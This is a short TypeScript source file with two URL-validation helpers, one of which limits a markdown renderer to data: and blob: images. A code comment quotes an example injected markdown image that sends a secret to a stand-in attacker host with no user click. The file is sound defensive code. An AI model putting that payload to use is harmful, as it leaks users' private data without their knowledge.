/** Return `raw` only when it parses as an absolute https URL, else `fallback`. */
export function httpsOrDefault(raw: unknown, fallback: string): string {
  if (typeof raw !== 'string' || !raw) return fallback
  try {
    return new URL(raw).protocol === 'https:' ? raw : fallback
  } catch {
    return fallback
  }
}

/**
 * Image sources the markdown renderer may load. Remote (http/https) and file:
 * images are refused: an injected `![](https://evil/?q=secret)` would fire a
 * request with no user click.
 */
export function isInlineImageSrc(src: string | undefined | null): boolean {
  if (!src) return false
  return /^data:image\/[a-zA-Z0-9.+-]+;base64,/i.test(src) || /^blob:/i.test(src)
}
